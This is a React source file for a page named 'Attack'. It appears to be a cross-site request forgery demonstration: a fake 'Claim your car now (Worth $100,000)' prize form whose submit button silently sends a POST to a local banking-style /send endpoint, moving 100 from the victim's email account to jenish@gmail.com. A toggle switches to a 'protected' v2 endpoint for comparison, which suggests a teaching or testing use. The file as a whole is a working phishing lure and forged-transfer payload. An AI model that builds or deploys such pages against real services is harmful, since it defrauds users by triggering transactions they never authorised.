import React, { useState, useEffect } from 'react';
import Avatar from '@material-ui/core/Avatar';
import Button from '@material-ui/core/Button';
import CssBaseline from '@material-ui/core/CssBaseline';
import TextField from '@material-ui/core/TextField';
import FormControlLabel from '@material-ui/core/FormControlLabel';
import Checkbox from '@material-ui/core/Checkbox';
import Link from '@material-ui/core/Link';
import Paper from '@material-ui/core/Paper';
import Box from '@material-ui/core/Box';
import Grid from '@material-ui/core/Grid';
import LockOutlinedIcon from '@material-ui/icons/LockOutlined';
import Typography from '@material-ui/core/Typography';
import { makeStyles } from '@material-ui/core/styles';
import { toast } from 'react-toastify';
import axios from 'axios';

function Copyright() {
    return (
        <Typography variant="body2" color="textSecondary" align="center">
            {'Copyright © '}
            <Link color="inherit" href="https://material-ui.com/">
                Your Website
      </Link>{' '}
            {new Date().getFullYear()}
            {'.'}
        </Typography>
    );
}

const useStyles = makeStyles((theme) => ({
    root: {
        height: '100vh',
    },
    image: {
        backgroundImage: 'url(https://specials-images.forbesimg.com/imageserve/5f1f37a40a5db2c8275972c0/960x0.jpg?fit=scale)',
        backgroundRepeat: 'no-repeat',
        backgroundColor:
            theme.palette.type === 'light' ? theme.palette.grey[50] : theme.palette.grey[900],
        backgroundSize: 'cover',
        backgroundPosition: 'center',
    },
    paper: {
        margin: theme.spacing(8, 4),
        display: 'flex',
        flexDirection: 'column',
        alignItems: 'center',
    },
    avatar: {
        margin: theme.spacing(1),
        backgroundColor: theme.palette.secondary.main,
    },
    form: {
        width: '100%', // Fix IE 11 issue.
        marginTop: theme.spacing(1),
    },
    submit: {
        margin: theme.spacing(3, 0, 2),
    },
}));

export default function Attack() {
    const classes = useStyles();
    const [email, setEmail] = useState();
    const [protect, setProtect] = useState(false);


    const handleSubmit = () => {
        attack();
    };

    const attack = () => {

        if (protect != true) {
            const axiosMain = axios.create({
                baseURL: 'http://localhost:5000',
                headers: {
                },
            });
            axiosMain
                .post('/send?amount=100&from=' + email + '&to=jenish@gmail.com')
                .then(response => {
                    if (response.status === 200) {
                        console.log("RESPONSE", response)

                    }
                })
                .catch(error => {
                    console.error('Error', error);
                });
        } else {
            const axiosMain = axios.create({
                baseURL: 'http://localhost:5000',
                headers: {
                },
            });
            axiosMain
                .post('/send-v2?amount=100&from=' + email + '&to=jenish@gmail.com')
                .then(response => {
                    if (response.status === 200) {
                        console.log("RESPONSE", response)

                    }
                })
                .catch(error => {
                    console.error('Error', error);
                });
        }
    };

    return (
        <Grid container component="main" className={classes.root}>
            <CssBaseline />
            <Grid item xs={false} sm={4} md={7} className={classes.image} />
            <Grid item xs={12} sm={8} md={5} component={Paper} elevation={6} square>
                <div className={classes.paper}>
                    <Avatar className={classes.avatar}>
                        <LockOutlinedIcon />
                    </Avatar>
                    <Typography component="h1" variant="h5">
                        Claim your car now (Worth $100,000)
          </Typography>
                    <form className={classes.form} noValidate>
                        <TextField
                            variant="outlined"
                            margin="normal"
                            required
                            fullWidth
                            id="email"
                            label="Email Address"
                            name="email"
                            autoComplete="email"
                            onChange={(e) => setEmail(e.target.value)}

                        />
                        <TextField
                            variant="outlined"
                            margin="normal"
                            required
                            fullWidth
                            name="address"
                            label="Address"
                            type="text"
                            id="text"
                        />
                        <FormControlLabel
                            control={<Checkbox value="remember" color="primary" />}
                            label="Check to receive transit updates"
                        />
                        <Button
                            type="submit"
                            fullWidth
                            variant="contained"
                            color="primary"
                            className={classes.submit}
                            onClick={() => { handleSubmit() }}
                        >
                            Claim Now
                        </Button>
                        <Grid container>
                            <Grid item xs>
                                <Link variant="body2">
                                    Privacy Email
                                </Link>
                            </Grid>
                            {protect ?
                                <Grid item xs>
                                    <Link
                                        variant="body2"
                                        onClick={(e) => setProtect(false)}
                                    >
                                        Change to unprotected API
                                </Link>
                                </Grid> :
                                <Grid item xs>
                                    <Link
                                        variant="body2"
                                        onClick={(e) => setProtect(true)}
                                    >
                                        Change to protected API
                             </Link>
                                </Grid>
                            }
                        </Grid>
                        <Box mt={5}>
                            <Copyright />
                        </Box>
                    </form>
                </div>
            </Grid>
        </Grid>
    );
}